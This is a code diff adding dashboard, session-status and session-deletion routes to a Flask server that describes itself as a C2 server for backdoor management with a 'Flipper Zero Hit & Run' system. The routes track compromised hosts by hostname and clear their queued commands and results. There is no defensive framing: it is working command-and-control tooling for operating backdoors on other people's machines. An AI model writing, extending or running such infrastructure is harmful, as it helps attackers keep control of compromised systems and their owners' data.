@@ -1169,3 +1169,47 @@ This C2 server is optimized for Railway's infrastructure
 and provides a robust, scalable platform for global
 backdoor management with the Flipper Zero Hit & Run system.
 """
+
+@app.route("/")
+def dashboard():
+    return render_template("dashboard.html")
+
+@app.route("/api/toggle-status", methods=["POST"])
+def toggle_status():
+    try:
+        data = request.get_json()
+        if data.get('api_key') != API_KEY:
+            return jsonify({'error': 'Unauthorized'}), 401
+        hostname = data.get('hostname', '').strip()
+        if not hostname:
+            return jsonify({'error': 'Hostname required'}), 400
+        with db_lock:
+            with sqlite3.connect(DATABASE_FILE) as conn:
+                cursor = conn.execute('SELECT status FROM sessions WHERE hostname = ?', (hostname,))
+                row = cursor.fetchone()
+                if not row:
+                    return jsonify({'error': 'Session not found'}), 404
+                current_status = row[0]
+                new_status = 'inactive' if current_status == 'active' else 'active'
+                conn.execute('UPDATE sessions SET status = ? WHERE hostname = ?', (new_status, hostname))
+        return jsonify({'message': f'Status für {hostname} geändert zu {new_status}'}), 200
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route("/api/delete-session", methods=["POST"])
+def delete_session():
+    try:
+        data = request.get_json()
+        if data.get('api_key') != API_KEY:
+            return jsonify({'error': 'Unauthorized'}), 401
+        hostname = data.get('hostname', '').strip()
+        if not hostname:
+            return jsonify({'error': 'Hostname required'}), 400
+        with db_lock:
+            with sqlite3.connect(DATABASE_FILE) as conn:
+                conn.execute('DELETE FROM sessions WHERE hostname = ?', (hostname,))
+                conn.execute('DELETE FROM commands WHERE session_hostname = ?', (hostname,))
+                conn.execute('DELETE FROM command_results WHERE session_hostname = ?', (hostname,))
+        return jsonify({'message': f'Session {hostname} gelöscht'}), 200
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
